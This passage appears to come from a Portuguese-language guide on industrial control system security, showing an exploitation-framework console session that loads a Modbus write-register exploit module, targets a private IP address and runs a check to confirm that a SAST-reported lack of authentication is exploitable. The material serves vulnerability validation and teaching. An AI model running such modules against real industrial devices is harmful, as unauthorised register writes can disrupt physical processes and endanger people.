# SAST identificou vulnerabilidade Modbus sem autenticação
ixf > use exploits/protocols/modbus/modbus_write_register
ixf > set target 192.168.1.100
ixf > check
# Confirmar que vulnerabilidade identificada pelo SAST é realmente exploitável
```

---

*Anterior: [MITRE ATT&CK for ICS](06-mitre-attack-ics.md) | Próximo: [Protocolos e Vendors](08-protocolos-vendors.md)*
